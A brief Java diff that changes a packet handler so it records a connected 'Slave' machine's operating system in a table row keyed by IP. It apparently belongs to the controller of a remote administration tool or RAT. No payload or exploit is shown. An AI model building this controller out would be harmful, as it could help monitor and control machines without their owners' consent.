@@ -6,18 +6,17 @@ import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.Frame;
 import com.redpois0n.utils.Util;
 
-public class Packet22InitUsername extends AbstractIncomingPacket {
+public class Packet16InitOperatingSystem extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
-		String line = slave.readLine();
-		slave.setUsername(line);
-		Frame.mainModel.setValueAt(slave.getUsername() + "@" + slave.getComputerName(), Util.getRow(3, slave.getIP()), 5);
+		slave.setOperatingSystem(slave.readLine());
+		Frame.mainModel.setValueAt(slave.getOperatingSystem(), Util.getRow(3, slave.getIP()), 6);
 	}
 
 	@Override
 	public byte getPacketId() {
-		return 22;
+		return 16;
 	}
 
 }
